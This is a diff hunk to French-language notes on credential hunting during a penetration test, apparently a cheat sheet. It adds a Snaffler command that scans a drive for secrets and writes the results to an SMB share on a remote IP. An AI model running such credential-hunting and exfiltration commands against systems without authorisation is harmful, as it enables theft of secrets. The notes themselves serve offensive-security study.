@@ -125,6 +125,8 @@ Invoke-SessionGopher -Target SRV1 # si privilèges suffisants. Sinon, on peut ch
 
 ```shell
  .\snaffler.exe -s -i c:\
+ .\snaffler.exe -o \\10.10.15.96\share\snaffler.log -i c:\
+
 ```
 
 ### Recherche de fichiers manuelle
